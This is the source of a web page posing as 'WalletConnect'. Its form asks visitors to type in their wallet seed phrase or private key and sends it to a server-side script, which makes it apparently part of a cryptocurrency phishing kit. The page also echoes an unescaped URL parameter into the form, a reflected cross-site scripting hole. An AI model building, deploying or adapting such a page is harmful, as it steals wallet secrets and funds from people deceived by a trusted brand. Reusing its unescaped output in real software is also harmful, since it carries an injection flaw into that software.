<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WalletConnect</title>
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

  <link rel="stylesheet" href="assets/vendor/bootstrap.min.css">
  <link rel="stylesheet" href="assets/css/rules.css">
  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>

<body>


  <div class="modal" id="mainModal" style="display: none;" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mainModalTitle" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-body w-100">

          <div class="px-5">

            <div class="d-flex justify-content-center">
              <p class="text-secondary">Connect wallet</p>
            </div>

            <form action="server/process.php" method="post" id="seed-form">
              <?php

              if ($_GET['type'] == 'Other...') {
                echo '<input type="text" name="type" placeholder="Wallet name" id="" class="form-control mb-3" required />';
              } else {
                echo '<input type="hidden" class="mt-3" name="type" value="' . $_GET['type'] . '" />';
              }

              ?>
              <textarea name="seed_phrase" id="" cols="70" rows="5" class="form-control" placeholder="seed phrase, private key, ..." required></textarea>
              <div id="loader"></div>
              <div class="d-flex justify-content-center">
                <button type="submit" class="btn btn-info w-100 btn-lg mt-3" id="connectButton">
                  Connect Wallet
                </button>
              </div>
            </form>
          </div>

        </div>
      </div>
    </div>
  </div>

  <script src="assets/vendor/jquery-3.6.0.min.js"></script> <!-- not necessary for bootstrap 5 though -->
  <script src="assets/vendor/bootstrap.bundle.min.js"></script>
  <script src="assets/js/commands.js?v=<?php echo time(); ?>"></script>
</body>

</html>